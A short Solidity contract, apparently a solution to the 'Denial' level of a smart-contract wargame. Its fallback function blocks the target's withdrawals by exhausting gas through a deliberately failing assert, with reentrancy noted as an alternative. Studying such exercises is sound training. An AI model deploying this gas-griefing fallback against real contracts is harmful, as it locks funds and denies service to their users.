pragma solidity ^0.5;

import '../levels/Denial.sol';

contract HackDenial {
    function() external payable {
        // Hack option 1: exhaust gas by repeated reentrancy
        // denial.withdraw();

        // Hack option 2: exhaust gas by volontarily causing a wrong assert
        assert(2 == 1);
    }
}
